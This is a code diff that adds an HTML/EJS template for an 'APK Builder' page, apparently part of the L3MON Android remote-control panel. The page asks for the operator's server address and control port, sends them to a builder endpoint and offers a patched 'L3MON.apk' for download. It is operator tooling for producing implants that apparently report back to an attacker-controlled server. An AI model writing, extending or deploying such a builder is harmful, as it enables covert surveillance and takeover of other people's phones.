@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+
+<% include partials/head.ejs %>
+
+
+<body>
+    <div class="ui container">
+        <% include partials/header.ejs %>
+        <div class="ui segment">
+
+            <div id="dimmer" class="ui dimmer">
+                <div class="ui indeterminate text loader" id="loadingText">Submitting</div>
+            </div>
+
+            <h1 class="ui" style="text-align: center">APK Builder</h1>
+            <div class="ui form" id="form">
+                <div class="inline fields">
+                    <div class="six wide field">
+                        <div class="ui labeled input">
+                            <div class="ui label">
+                                http://
+                            </div>
+                            <input type="text" id="uriInput" placeholder="IP / Public URL"
+                                title="This is the public url of your server (l3mon.domain.com)">
+                        </div>
+                    </div>
+                    <div class="two wide field">
+                        <label>:</label>
+                        <input type="number" id="portInput" placeholder="PORT" min="2048" max="25565"
+                            title="This is the `control_port` set in the consts" value="<%= myPort %>">
+                    </div>
+
+                </div>
+                <div class="inline fields">
+                    <div class="eight wide field">
+                        <button id="gobuild" class="positive ui fluid button"><i class="wrench icon"></i>Build</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="ui form" id="download" style="display: none">
+                <div class="inline fields">
+                    <div class="eight wide field">
+                        <a class="blue ui fluid button" download="L3MON.apk" href="/build.s.apk"><i
+                                class="download icon"></i>Download</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <style>
+        .inline.fields {
+            justify-content: center;
+        }
+    </style>
+
+    <script>
+
+        var loadingTexts = [
+            "Decompiling APK",
+            "Patching Server Information",
+            "Compiling APK",
+            "Signing APK",
+            "Verifying Build",
+            "Finalizing"
+        ];
+
+        var loadingIndex = 0;
+        var isDone = false;
+        $('#gobuild').click((e) => {
+            $('#dimmer').addClass('active');
+            build($('#uriInput').val(), $('#portInput').val());
+            setTimeout(loaderText, 500);
+        });
+
+        function loaderText() {
+            var nextTimeout = Math.floor(Math.random() * 1500) + 700;
+            $('#loadingText').text(loadingTexts[loadingIndex]);
+            loadingIndex++;
+            if (loadingIndex !== loadingTexts.length) setTimeout(loaderText, nextTimeout);
+            else while (isDone) {
+                isDone = false;
+                $('#dimmer').fadeOut(500, () => {
+                    $('#download').removeClass('active');
+                })
+                $('#form').fadeOut(500, () => {
+                    $('#download').fadeIn(200);
+                })
+            }
+        }
+
+        function build(URI, PORT) {
+            $.post("/builder?uri=" + URI + "&port=" + PORT, function (data) {
+                if (!data.error) {
+                    isDone = true
+                } else showNotification('#f03434', data.error)
+            });
+        }
+
+    </script>
+    <% include partials/footer.ejs %>
+</body>
+
+</html>
